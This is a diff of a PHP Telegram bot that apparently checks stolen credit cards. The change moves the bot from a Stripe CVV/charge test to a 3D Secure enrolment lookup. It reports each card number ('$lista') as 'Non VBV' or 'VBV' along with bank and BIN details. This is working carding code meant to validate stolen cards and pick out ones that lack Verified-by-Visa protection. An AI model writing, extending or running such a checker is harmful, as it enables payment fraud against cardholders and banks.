@@ -353,6 +353,8 @@ $token = trim(strip_tags(capture($roll4, 'token":"', '"')));
                 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                 curl_setopt($ch, CURLOPT_POSTFIELDS, $lookupdata);
                 $roll5 = curl_exec($ch);
+$lookupstatus = trim(strip_tags(capture($roll5, 'status":"', '"')));
+$lookupenrolled = trim(strip_tags(capture($roll5, 'enrolled":"', '"')));
 
 
             }
@@ -363,7 +365,7 @@ $token = trim(strip_tags(capture($roll4, 'token":"', '"')));
             ###END OF CHECKER PART###
 
 
-            if(strpos($roll3, 'succeeded')) {
+            if(strpos($roll5, 'lookup_not_enrolled')) {
                 addTotal();
                 addUserTotal($userId);
                 addCVV();
@@ -373,11 +375,10 @@ $token = trim(strip_tags(capture($roll4, 'token":"', '"')));
                 bot('editMessageText',[
                   'chat_id'=>$chat_id,
                   'message_id'=>$messageidtoedit,
-                  'text'=>"<b>Card:</b> <code>$lista</code>
-<b>Status -» CVV or CCN ✅
-Response -» $result2
-Gateway -» 1💲 STRIPE
-Time -» <b>$time</b><b>s</b>
+                  'text'=>"<b>💳 CC:</b> <code>$lista</code>
+<b>➤ Status -» Non VBV ✅
+➤ Response -» $lookupstatus - $lookupenrolled
+➤ Gateaway: 3D Check[B3]
 
 ------- Bin Info -------</b>
 <b>Bank -»</b> $bank
@@ -402,10 +403,9 @@ Time -» <b>$time</b><b>s</b>
                   'chat_id'=>$chat_id,
                   'message_id'=>$messageidtoedit,
                   'text'=>"<b>Card:</b> <code>$lista</code>
-<b>Status -» API Down ❌
-Response -» $result2
-Gateway -» 1 Charge
-Time -» <b>$time</b><b>s</b>
+<b>➤ Status -» API Down ❌
+➤ Response -» $lookupstatus - $lookupenrolled
+➤ Gateaway: 3D Check[B3]
 
 ------- Bin Info -------</b>
 <b>Bank -»</b> $bank
@@ -429,13 +429,10 @@ Time -» <b>$time</b><b>s</b>
                 bot('editMessageText',[
                   'chat_id'=>$chat_id,
                   'message_id'=>$messageidtoedit,
-                  'text'=>"<b>Card:</b> <code>$lista</code>
-<b>Status -» Declined! ❌
-Response -» $roll4
-Decline Error -» roll 5 - $roll5
-Result -»
-Gateway -» 1💲 STRIPE
-Time -» <b>$time</b><b>s</b>
+                  'text'=>"<b>💳 CC:</b> <code>$lista</code>
+<b>➤ Status -» VBV! ❌
+➤ Response -» $lookupstatus - $lookupenrolled
+➤ Gateaway: 3D Check[B3]
 
 ------- Bin Info -------</b>
 <b>Bank -»</b> $bank
